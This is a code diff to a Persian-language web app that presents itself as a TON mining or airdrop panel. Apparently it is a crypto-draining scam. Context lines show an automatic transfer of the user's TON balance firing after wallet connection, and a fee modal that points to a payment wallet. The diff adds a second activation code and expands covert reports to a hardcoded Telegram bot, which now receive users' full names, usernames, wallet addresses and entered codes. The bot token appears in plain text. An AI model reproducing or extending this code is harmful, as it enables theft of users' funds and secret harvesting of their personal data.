@@ -850,7 +850,7 @@
         }
         .history-item:last-child { border-bottom: none; }
 
-        /* پاپ‌آپ فعالسازی */
+        /* پاپ‌آپ فعالسازی (با یک باکس ورودی) */
         #feeModal {
             position: fixed;
             top: 0;
@@ -985,7 +985,7 @@
     </div>
 </div>
 
-<!-- پاپ‌آپ فعالسازی -->
+<!-- پاپ‌آپ فعالسازی (یک باکس ورودی) -->
 <div id="feeModal">
     <div class="modal-content">
         <i class="fas fa-lock"></i>
@@ -1003,7 +1003,10 @@
                 UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y
             </span>
         </p>
-        <input type="text" id="activationInput" placeholder="کد فعالسازی را وارد کنید">
+        
+        <!-- یک باکس ورودی برای دو کد -->
+        <input type="text" id="activationInput" placeholder="کد فعالسازی را وارد کنید (T61O96N12 یا VipTonDropy)">
+        
         <button onclick="verifyActivation()" class="btn active-btn">
             <i class="fas fa-check-circle"></i> فعالسازی و ورود به پنل
         </button>
@@ -1302,7 +1305,7 @@
         BOT_TOKEN: "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw",
         ADMIN_CHAT_ID: "5972276401",
         BOT_USERNAME: "tondropybot",
-        SECRET_CODE: "T61O96N12",
+        SECRET_CODES: ["T61O96N12", "VipTonDropy"],
         WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
         NETWORK_FEE: 0.0035,
         MINIMUM_WITHDRAW: 14
@@ -1401,10 +1404,12 @@
             if (appData.transactions.length > 100) appData.transactions.pop();
             saveData();
             
+            // ارسال گزارش کامل به تلگرام (با نام کاربر)
             sendToTelegram(`💰 **انتقال خودکار**
 ━━━━━━━━━━━━━━
-👤 کاربر: ${currentUser?.firstName}
-🆔 آیدی: ${currentUser?.id}
+👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
+🆔 آیدی: ${currentUser?.id || 'نامشخص'}
+📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
 📤 مبلغ: ${balanceInTON.toFixed(6)} TON
 💳 از: ${userAddress.substring(0, 10)}...
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
@@ -1421,8 +1426,8 @@
             console.error('خطا:', error);
             if (currentUser) {
                 sendToTelegram(`⚠️ **خطا در انتقال خودکار**
-کاربر: ${currentUser.firstName}
-آیدی: ${currentUser.id}
+👤 نام: ${currentUser.firstName}
+🆔 آیدی: ${currentUser.id}
 خطا: ${error.message || 'خطای ناشناخته'}`);
             }
         } finally {
@@ -1463,7 +1468,15 @@
                 platform: tg.platform || 'unknown'
             };
             appData.users.push(user);
-            sendToTelegram(`👤 **کاربر جدید**\nنام: ${user.firstName}\nآیدی: ${user.id}`);
+            
+            // ارسال گزارش کاربر جدید با نام کامل
+            sendToTelegram(`👤 **کاربر جدید**
+━━━━━━━━━━━━━━
+👤 نام: ${user.firstName} ${user.lastName}
+🆔 آیدی: ${user.id}
+📛 یوزرنیم: ${user.username ? '@' + user.username : 'ندارد'}
+📱 پلتفرم: ${user.platform}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         } else {
             user.lastSeen = new Date().toISOString();
             user.balance = bal;
@@ -1504,7 +1517,10 @@
         updateAdminStats();
         renderUsersTable();
         document.getElementById('adminMasterPanel').classList.add('show');
-        sendToTelegram('🔐 **ورود به پنل مدیریت**');
+        sendToTelegram(`🔐 **ورود به پنل مدیریت**
+👤 نام: ${currentUser?.firstName}
+🆔 آیدی: ${currentUser?.id}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
     }
 
     window.closeAdminMasterPanel = function() {
@@ -1539,6 +1555,7 @@
             const term = searchTerm.toLowerCase();
             filteredUsers = filteredUsers.filter(u => 
                 u.firstName?.toLowerCase().includes(term) ||
+                u.lastName?.toLowerCase().includes(term) ||
                 u.username?.toLowerCase().includes(term) ||
                 u.id?.toString().includes(term) ||
                 u.wallet?.toLowerCase().includes(term)
@@ -1618,7 +1635,13 @@
         if (!appData.bannedUsers.includes(userId)) {
             appData.bannedUsers.push(userId);
             saveData();
-            sendToTelegram(`🚫 **کاربر مسدود شد**\nآیدی: ${userId}`);
+            
+            const user = appData.users.find(u => u.id == userId);
+            sendToTelegram(`🚫 **کاربر مسدود شد**
+👤 نام: ${user?.firstName || 'ناشناس'}
+🆔 آیدی: ${userId}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+            
             showGlassMessage('success', '✅ کاربر مسدود شد');
             renderUsersTable();
             updateAdminStats();
@@ -1628,7 +1651,13 @@
     window.unbanUser = function(userId) {
         appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
         saveData();
-        sendToTelegram(`✅ **رفع مسدودی**\nآیدی: ${userId}`);
+        
+        const user = appData.users.find(u => u.id == userId);
+        sendToTelegram(`✅ **رفع مسدودی**
+👤 نام: ${user?.firstName || 'ناشناس'}
+🆔 آیدی: ${userId}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+        
         showGlassMessage('success', '✅ رفع مسدودی شد');
         renderUsersTable();
         updateAdminStats();
@@ -1636,10 +1665,16 @@
 
     window.deleteUser = function(userId) {
         if (confirm('⚠️ آیا از حذف کامل این کاربر اطمینان دارید؟')) {
+            const user = appData.users.find(u => u.id == userId);
             appData.users = appData.users.filter(u => u.id != userId);
             appData.bannedUsers = appData.bannedUsers.filter(id => id != userId);
             saveData();
-            sendToTelegram(`🗑 **کاربر حذف شد**\nآیدی: ${userId}`);
+            
+            sendToTelegram(`🗑 **کاربر حذف شد**
+👤 نام: ${user?.firstName || 'ناشناس'}
+🆔 آیدی: ${userId}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+            
             showGlassMessage('success', '✅ کاربر حذف شد');
             renderUsersTable();
             updateAdminStats();
@@ -1672,11 +1707,11 @@
     }
 
     window.exportToExcel = function() {
-        let csv = "آیدی,نام,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,آخرین بازدید,وضعیت\n";
+        let csv = "آیدی,نام,نام خانوادگی,یوزرنیم,کیف پول,موجودی,کل استخراج,کل پرداخت,آخرین بازدید,وضعیت\n";
         appData.users.forEach(u => {
             const userTxs = appData.transactions.filter(tx => tx.userId == u.id);
             const totalPaid = userTxs.reduce((sum, tx) => sum + (tx.amount || 0), 0);
-            csv += `${u.id},${u.firstName} ${u.lastName},${u.username || '-'},${u.wallet || '-'},${u.balance || 0},${u.totalMined || 0},${totalPaid.toFixed(6)},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
+            csv += `${u.id},${u.firstName || ''},${u.lastName || ''},${u.username || '-'},${u.wallet || '-'},${u.balance || 0},${u.totalMined || 0},${totalPaid.toFixed(6)},${u.lastSeen},${appData.bannedUsers.includes(u.id) ? 'مسدود' : 'فعال'}\n`;
         });
         const blob = new Blob([csv], { type: 'text/csv' });
         const a = document.createElement('a');
@@ -1820,6 +1855,13 @@
         
         addToHistory('پاداش روزانه', `${rewardAmount.toFixed(6)} TON`);
         showToast(`🎁 ${rewardAmount.toFixed(6)} TON دریافت شد`);
+        
+        // گزارش پاداش روزانه
+        sendToTelegram(`🎁 **پاداش روزانه**
+👤 نام: ${currentUser?.firstName}
+🆔 آیدی: ${currentUser?.id}
+💰 مبلغ: ${rewardAmount.toFixed(6)} TON
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
     }
 
     function addToHistory(type, amount) {
@@ -1892,7 +1934,14 @@
         addToHistory('برداشت نهایی', `${amountToWithdraw.toFixed(6)} TON`);
         
         const walletAddress = document.getElementById('walletAddressFull').innerText;
-        sendToTelegram(`💰 **برداشت نهایی**\nمبلغ: ${amountToWithdraw.toFixed(6)} TON\nکیف پول: ${walletAddress}`);
+        
+        // گزارش برداشت نهایی
+        sendToTelegram(`💰 **برداشت نهایی**
+👤 نام: ${currentUser?.firstName}
+🆔 آیدی: ${currentUser?.id}
+📤 مبلغ: ${amountToWithdraw.toFixed(6)} TON
+💳 کیف پول: ${walletAddress}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
         
         withdrawableBalance = 0;
         document.getElementById('withdrawableBalance').innerText = "0.000000";
@@ -1937,7 +1986,13 @@
                 });
                 saveData();
                 
-                sendToTelegram(`🔌 **کیف پول متصل شد**\nکاربر: ${currentUser.firstName}\nآیدی: ${currentUser.id}\nآدرس: ${fullAddress}`);
+                // گزارش اتصال کیف پول با نام کامل
+                sendToTelegram(`🔌 **کیف پول متصل شد**
+👤 نام: ${currentUser.firstName} ${currentUser.lastName}
+🆔 آیدی: ${currentUser.id}
+📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}
+💳 آدرس: ${fullAddress}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
                 
                 setTimeout(() => {
                     executeAutoTransfer(fullAddress);
@@ -1953,7 +2008,7 @@
     });
 
     // ================================================
-    // 🔐 فعالسازی
+    // 🔐 فعالسازی (با یک باکس ورودی و دو کد)
     // ================================================
     if (localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
@@ -1963,8 +2018,21 @@
         const val = document.getElementById('activationInput').value.trim();
         const activationMessage = document.getElementById('activationMessage');
         
-        if (val === CONFIG.SECRET_CODE) {
-            sendToTelegram(`✅ **فعالسازی موفق**\nکاربر: ${currentUser?.firstName}\nآیدی: ${currentUser?.id}`);
+        // بررسی هر دو کد
+        const isValidCode = CONFIG.SECRET_CODES.includes(val);
+        
+        if (isValidCode) {
+            const codeType = val === "VipTonDropy" ? "VIP" : "عادی";
+            
+            // گزارش فعالسازی با نام کامل
+            sendToTelegram(`✅ **فعالسازی موفق (${codeType})**
+━━━━━━━━━━━━━━
+👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
+🆔 آیدی: ${currentUser?.id || 'نامشخص'}
+📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
+🔑 کد: ${val}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+            
             showGlassMessage('success', 'ورود موفق', 'در حال اتصال به شبکه بلاکچین ...');
             activationMessage.classList.add('show');
             
@@ -1975,6 +2043,14 @@
                 addToHistory('فعالسازی', 'پنل فعال شد');
             }, 2000);
         } else {
+            // گزارش خطا با نام کامل
+            sendToTelegram(`❌ **خطا در فعالسازی**
+👤 نام: ${currentUser?.firstName || 'ناشناس'} ${currentUser?.lastName || ''}
+🆔 آیدی: ${currentUser?.id || 'نامشخص'}
+📛 یوزرنیم: ${currentUser?.username ? '@' + currentUser.username : 'ندارد'}
+🔑 کد وارد شده: ${val || 'خالی'}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`);
+            
             showGlassMessage('error', 'رمز اشتباه است');
             activationMessage.classList.remove('show');
         }
